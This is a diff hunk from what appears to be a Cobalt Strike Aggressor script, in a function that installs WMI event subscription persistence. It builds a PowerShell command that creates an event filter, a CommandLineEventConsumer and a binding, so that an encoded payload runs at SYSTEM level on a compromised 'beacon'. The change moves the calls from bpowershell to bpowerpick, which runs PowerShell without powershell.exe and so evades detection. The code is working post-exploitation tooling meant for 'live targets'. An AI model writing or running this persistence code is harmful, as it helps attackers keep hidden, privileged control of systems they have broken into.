@@ -28,10 +28,10 @@ sub persistwmievent  {
 		}
 		else {
 			$powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name=\"".$3['eventfilter']."\";EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"".$3['eventquery']."\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name=\"".$3['eventfilter']."\";CommandLineTemplate =\"". $ExePath ." ".$3['payloadstring']."\"};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
-			bpowershell!($bid, $powershellcmd);
+			bpowerpick!($bid, $powershellcmd);
 			blog($bid, 'Permanently Storing '.$3['eventfilter'].' in root\CimV2..');
-			bpowershell($bid, 'Get-WmiObject __eventFilter -namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
-			bpowershell($bid, 'Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
+			bpowerpick($bid, 'Get-WmiObject __eventFilter -namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
+			bpowerpick($bid, 'Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
 		}
 	}));
 	dialog_description($dialog, "Generates a Custom WMI Event using PowerShell for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload String must be converted to UTF-16LE, base64 encoded and under 1MB.**");
